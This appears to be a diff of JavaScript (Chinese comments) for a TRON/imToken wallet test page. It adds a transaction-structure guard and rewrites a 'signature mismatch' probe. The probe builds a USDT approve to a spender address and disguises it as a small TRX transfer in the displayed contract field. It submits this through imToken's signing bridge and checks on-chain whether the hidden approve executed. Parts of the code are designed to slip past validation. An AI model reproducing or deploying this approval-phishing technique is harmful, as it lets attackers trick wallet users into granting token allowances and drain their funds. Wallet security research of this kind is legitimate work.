@@ -118,6 +118,38 @@
     return candidates.find(item => typeof item === 'string' && /^[0-9a-fA-F]{64}$/.test(item)) || '';
   }
 
+  function validateBridgeTxShape(tx) {
+    const contract = tx?.raw_data?.contract?.[0];
+    const problems = [];
+    if (!contract || typeof contract !== 'object') {
+      problems.push('raw_data.contract[0] 缺失');
+      return problems;
+    }
+    if (
+      Object.prototype.hasOwnProperty.call(contract, '1') ||
+      Object.prototype.hasOwnProperty.call(contract, '2')
+    ) {
+      problems.push('contract 含歧义的 Protobuf 数字字段');
+    }
+    if (typeof contract.type !== 'string' || !contract.type) {
+      problems.push('contract.type 缺失');
+    }
+    if (!contract.parameter || typeof contract.parameter !== 'object') {
+      problems.push('contract.parameter 缺失');
+    } else {
+      if (typeof contract.parameter.type_url !== 'string' || !contract.parameter.type_url) {
+        problems.push('contract.parameter.type_url 缺失');
+      }
+      if (!contract.parameter.value || typeof contract.parameter.value !== 'object') {
+        problems.push('contract.parameter.value 缺失');
+      }
+    }
+    if (typeof tx.raw_data_hex !== 'string' || !tx.raw_data_hex) {
+      problems.push('raw_data_hex 缺失');
+    }
+    return problems;
+  }
+
   async function connect() {
     log('检查钱包环境…', 'warn');
     if (!hasBridge()) {
@@ -207,6 +239,12 @@
     log('TX contract 键顺序: ' + Object.keys(firstContract || {}).join(' → '), 'warn');
     log('TX raw_data.contract: ' + JSON.stringify(firstContract), 'warn');
     log('TX raw_data_hex 前64字节: ' + (tx.raw_data_hex || '').slice(0, 64), 'warn');
+    const shapeProblems = validateBridgeTxShape(tx);
+    if (shapeProblems.length) {
+      log('已阻止调用 imToken 原生桥: ' + shapeProblems.join('；'), 'error');
+      log('该结构不是标准 TRON 交易，钱包确认页可能因解引用缺失字段而退出', 'error');
+      return false;
+    }
     try {
       const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
         tx, from: walletAddr, useTronHeader: true
@@ -324,90 +362,112 @@
     }
   }
 
-  // 直接广播测试：绕过 imToken 桥接，直接 POST TronGrid
-  // 用于分离判断错误来源是桥接层还是 java-tron 节点层
+  // 回链查询某笔交易实际记录的合约类型（判定"执行层"到底是什么）
+  async function fetchOnchainType(txid) {
+    try {
+      const r = await fetch(TRON_API + '/wallet/gettransactionbyid', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ value: txid })
+      });
+      const d = await r.json();
+      return d?.raw_data?.contract?.[0]?.type || '';
+    } catch (e) { return ''; }
+  }
+  async function fetchOnchainTypeRetry(txid, tries) {
+    for (let i = 0; i < tries; i++) {
+      const t = await fetchOnchainType(txid);
+      if (t) return t;
+      await new Promise(r => setTimeout(r, 4000));
+    }
+    return '';
+  }
+
+  // ⑤ 所见非所签探针（修正版）
+  // 关键事实：节点验签与执行都锚定同一份 raw_data 的 protobuf 序列化，txID = sha256(raw_data)。
+  //   所以"直接广播一笔显示≠执行的交易"在节点层无法通过验签（raw_data 是 transfer 就执行 transfer，
+  //   数字键 / raw_data_hex 节点都不认）。真正能制造"显示≠执行"缝隙的，只有 imToken 客户端
+  //   是否信任 raw_data_hex。
+  // 因此本探针：raw_data_hex / txID 锚定 approve（执行+签名权威），raw_data.contract 叠加为真实
+  //   TransferContract（仅供 UI 显示），二者自洽到能产出有效签名；经 imToken 签名广播后回链查
+  //   contract.type 判定：
+  //     · TriggerSmartContract → imToken 以 hex 为准 → UI 转账 / 链上 approve → 漏洞成立
+  //     · TransferContract     → imToken 以 raw_data 为准 → 所见即所签 → 无此漏洞
   async function directBroadcastTest() {
+    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
     if (!walletAddr) { log('请先连接钱包', 'error'); return; }
-    log('=== 直接广播分离测试 ===', 'warn');
+    log('=== 所见非所签探针（修正版）===', 'warn');
     try {
       const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
       const userHex = window.tronWeb.address.toHex(walletAddr);
 
-      // 构造一个标准 approve（不修改任何东西）
-      const { transaction, result } = await window.tronWeb.transactionBuilder.triggerSmartContract(
+      // 1) 执行层（权威）：标准 approve —— 决定签名锚定与链上语义
+      const built = await window.tronWeb.transactionBuilder.triggerSmartContract(
         contractHex, 'approve(address,uint256)',
         { feeLimit: 100_000_000, callValue: 0 },
         [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
         userHex
       );
-      if (!result?.result) { log('构造失败', 'error'); return; }
+      if (!built.result?.result) { log('approve 构造失败', 'error'); return; }
+      const approveTx = built.transaction;
+      const hasSelector = approveTx.raw_data_hex.includes('095ea7b3');
+      log('执行层 approve txID = ' + approveTx.txID, 'warn');
+      log('raw_data_hex 含 approve 选择器 095ea7b3: ' + hasSelector, hasSelector ? 'success' : 'error');
 
-      const originalHex = transaction.raw_data_hex;
-      const realParam = transaction.raw_data.contract[0].parameter;
+      // 2) 显示层：真实 TransferContract —— 字段完整，imToken UI 可正常解析（不会缺字段闪退）
+      const transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      const transferContract = transferBuilt.raw_data.contract[0];
 
-      // 假 TransferContract
-      const fakeParam = {
-        type_url: 'type.googleapis.com/protocol.TransferContract',
-        value: { amount: 100000, to_address: SPENDER, owner_address: walletAddr }
+      // 3) 组装：执行层(hex/txID)=approve，显示层(contract)=transfer
+      const submitTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,
+        raw_data: Object.assign({}, approveTx.raw_data, { contract: [transferContract] }),
+        raw_data_hex: approveTx.raw_data_hex
       };
+      log('显示层 contract.type = ' + transferContract.type + '（UI 预期：转账）', 'warn');
+      log('执行层 raw_data_hex 前64 = ' + approveTx.raw_data_hex.slice(0, 64), 'warn');
 
-      // 手动拼 JSON — 字符串键在前，数字键在后（绕过 V8 整数键优先排序）
-      const contractJson = '{' +
-        '"type":"TransferContract",' +
-        '"parameter":' + JSON.stringify(fakeParam) + ',' +
-        '"__p01":1,"__p02":2,"__p03":3,"__p04":4,"__p05":5,' +
-        '"__p06":6,"__p07":7,"__p08":8,"__p09":9,"__p10":10,' +
-        '"1":31,' +
-        '"2":' + JSON.stringify(realParam) +
-      '}';
-
-      log('手动拼的 contract JSON (前120字): ' + contractJson.slice(0, 120), 'warn');
-      log('数字键 "1"/"2" 位置: ' + (contractJson.indexOf('"1":') < contractJson.indexOf('"type":') ? '❌ 前' : '✅ 后'), 'warn');
-
-      // 替换 contract[0] — 用 JSON.parse 还原对象，但 V8 会重排...
-      // 所以改用替换整个 raw_data.contract 数组元素后立即发送
-      const mixedContract = JSON.parse(contractJson);
-      transaction.raw_data.contract[0] = mixedContract;
-      transaction.raw_data_hex = originalHex;
-
-      // 用 sendTransaction 走 imToken 签名
-      log('先走 imToken sendTransaction…', 'warn');
-      const ok = await sendTx(transaction, '混合测试 (手动JSON排序)');
-      if (!ok) {
-        log('imToken 路径失败，尝试分离测试…', 'warn');
-        // 分离测试：用 tronWeb 本地签名 + 直接广播
-        try {
-          const cleanTx = await window.tronWeb.transactionBuilder.triggerSmartContract(
-            contractHex, 'approve(address,uint256)',
-            { feeLimit: 100_000_000, callValue: 0 },
-            [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
-            userHex
-          );
-          const signed = await window.tronWeb.trx.sign(cleanTx.transaction);
-          log('本地签名成功, txID: ' + signed.txID, 'success');
-
-          // 把签名附到混合交易上，直接广播
-          const mixedTx = { ...transaction };
-          mixedTx.signature = signed.signature || [signed.txID];
-
-          const resp = await fetch(TRON_API + '/wallet/broadcasttransaction', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(mixedTx)
-          });
-          const data = await resp.json();
-          log('TronGrid 直接返回: ' + JSON.stringify(data), 'warn');
-          if (data.result === true) {
-            log('✅ 直接广播成功！', 'success');
-          } else if (data.code || data.Error) {
-            log('❌ 节点拒绝: ' + (data.message || JSON.stringify(data)), 'error');
-          }
-        } catch (e2) {
-          log('分离测试异常: ' + (e2.message || e2), 'error');
+      // 4) 经 imToken 签名广播（结构合法、无数字键、字段完整 → 不触发桥接守卫，也不致闪退）
+      log('调用 imToken.tron.sendTransaction …', 'warn');
+      let res;
+      try {
+        res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+          tx: submitTx, from: walletAddr, useTronHeader: true
+        });
+      } catch (e) {
+        const msg = String(e?.message || e);
+        log('imToken 返回错误: ' + msg, 'error');
+        if (/sigerror|validate signature/i.test(msg)) {
+          log('→ imToken 用 raw_data(transfer) 重算签名，与 approve 的 txID 不一致 → 该版本对 hex/json 做了一致性校验（有防护）', 'error');
+        } else if (/reject|user_rejected/i.test(msg)) {
+          log('→ 用户在弹窗取消', 'warn');
+        } else if (/contract_validate/i.test(msg)) {
+          log('→ CONTRACT_VALIDATE_ERROR：参数/余额/能量校验失败，非签名问题', 'error');
         }
+        return;
+      }
+      log('imToken 原始返回: ' + JSON.stringify(res), 'warn');
+      const txid = findTxId(res);
+      if (!txid) {
+        log('未返回 64 位 txID，无法回链判定（imToken 可能仅返回 result，需手动查 Tronscan）', 'warn');
+        return;
+      }
+      log('✅ 已广播 txID = ' + txid, 'success');
+      log('Tronscan: https://tronscan.org/#/transaction/' + txid, 'info');
+
+      // 5) 回链判定执行层（节点实际记录的合约类型）
+      log('回链查询链上实际合约类型（最多 ~16s）…', 'warn');
+      const type = await fetchOnchainTypeRetry(txid, 4);
+      if (type === 'TriggerSmartContract') {
+        log('🔴 所见非所签确证：UI 显示转账(TransferContract)，链上实际执行 approve(TriggerSmartContract)', 'error');
+        await refreshAllowanceUI(false);
+      } else if (type === 'TransferContract') {
+        log('🟢 所见即所签：imToken 以 raw_data 为准，链上记录为转账，无此漏洞', 'success');
+      } else {
+        log('链上暂未确认该交易（可能尚未打包或被节点拒绝），可稍后点④手动查授权额度', 'warn');
       }
     } catch (e) {
-      log('直接广播测试异常: ' + (e.message || e), 'error');
+      log('探针异常: ' + (e.message || e), 'error');
     }
   }
 
